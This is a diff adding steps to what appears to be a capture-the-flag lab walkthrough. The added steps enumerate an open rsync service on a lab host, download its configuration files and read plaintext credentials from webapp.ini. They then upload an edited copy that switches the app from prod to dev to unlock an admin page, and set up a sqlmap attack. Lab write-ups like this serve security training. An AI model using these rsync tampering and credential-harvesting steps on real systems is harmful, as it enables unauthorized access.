@@ -73,6 +73,56 @@ Now going to http://10.10.97.133/admin
 
 We get 403 Forbidden ...
 
-accessing the source code we get -- make sure admin fuctionality can only be used in develop
+accessing the source code we get -- make sure admin fuctionality can only be used in development mode --------
+
+Now we have port 873 running which is Rsync you can read more about this here https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
+
+Now enumerate the rync module using 
+
+rsync -rdt rsync://10.10.38.244:873
+
+we get | Conf            All Confs |
+
+now listing content of Conf and dowloading its all file to local machine ..
+
+rsync -rdt rsync://10.10.38.244:873/Conf
+drwxrwxrwx          4,096 2021/04/11 01:33:08 .
+-rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
+-rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
+-rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
+-rw-r--r--            332 2021/04/10 01:31:38 ldap.conf
+-rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
+-rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
+-rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
+-rw-r--r--            320 2021/04/10 01:33:16 ports.conf
+-rw-r--r--            589 2021/04/10 01:31:07 resolv.conf
+-rw-r--r--             29 2021/04/10 01:32:56 screen-cleanup.conf
+-rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
+-rw-rw-r--             72 2021/04/11 01:33:06 webapp.ini
+
+Downloading .......
+rsync -av rsync://10.10.38.244:873/Conf ./conf
+
+now reading all the files we have webapp.ini file 
+
+cat webapp.ini 
+[Web_App]
+env = prod
+user = tom
+password = theCat
+
+[Details]
+Local = No
 
 
+now the env variable is set to prod .... change this to dev(for development )
+
+and uploading back the new webapp.ini file to server ...
+
+rsync -av webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
+
+Now accessing the page http://10.10.97.133/admin/
+
+we get 2.png
+
+now accessing this using brupsuite and saving the request to use the sqlmap --------
